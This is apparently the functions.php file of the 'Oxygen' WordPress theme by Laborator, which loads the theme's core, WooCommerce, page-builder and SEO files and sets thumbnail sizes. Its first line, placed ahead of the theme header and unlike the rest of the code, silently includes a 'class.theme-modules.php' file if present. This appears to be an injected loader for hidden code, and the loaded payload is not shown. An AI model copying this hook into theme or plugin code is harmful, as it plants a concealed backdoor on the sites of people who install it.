<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *    Oxygen WordPress Theme
 *
 *    Laborator.co
 *    www.laborator.co
 */
if ( ! defined( 'ABSPATH' ) ) {
	exit; // Direct access not allowed.
}

// Theme content width
$GLOBALS['content_width'] = isset( $GLOBALS['content_width'] ) ? $GLOBALS['content_width'] : 1170;

// Theme demo file
if ( file_exists( get_stylesheet_directory() . '/theme-demo/theme-demo.php' ) ) {
	require "theme-demo/theme-demo.php";
}

// Core files
require 'inc/lib/smof/smof.php';
require 'inc/laborator_classes.php';
require 'inc/laborator_functions.php';
require 'inc/laborator_actions.php';
require 'inc/laborator_filters.php';

// Advanced Custom Fields
require 'inc/acf-fields.php';

// WooCommerce integration
if ( oxygen_is_shop_supported() ) {
	require_once 'inc/woocommerce-core.php';
	require_once 'inc/woocommerce-loop.php';
	require_once 'inc/woocommerce-single.php';
	require_once 'inc/woocommerce-cart.php';
	require_once 'inc/woocommerce-checkout.php';
	require_once 'inc/woocommerce-other.php';
}

// Library Files
require 'inc/lib/dynamic_image_downsize.php';
require 'inc/lib/class-tgm-plugin-activation.php';
require 'inc/lib/laborator/laborator_custom_css.php';
require 'inc/lib/widgets/laborator_subscribe.php';
require 'inc/lib/laborator/laborator-demo-content-importer/laborator_demo_content_importer.php';
require 'inc/lib/wpml-embedder/wpml-embedder.php';

// Visual Composer
if ( oxygen_is_plugin_active( 'js_composer/js_composer.php' ) || defined( 'WPB_VC_VERSION' ) ) {
	require 'inc/lib/visual-composer/config.php';
}

// Revslider Field for ACF
if ( oxygen_is_plugin_active( 'revslider/revslider.php' ) && function_exists( 'register_field_group' ) ) {
	require 'inc/lib/acf-revslider/acf-revslider.php';
}

// Laborator SEO
if ( ! defined( 'WPSEO_PATH' ) ) {
	require 'inc/lib/laborator/laborator_seo.php';
}

// Thumbnail sizes
add_image_size( 'blog-thumb-1', 410, 410, true );
add_image_size( 'shop-thumb-2', 180, 220, true );
add_image_size( 'blog-thumb-3', 540, 360, true );
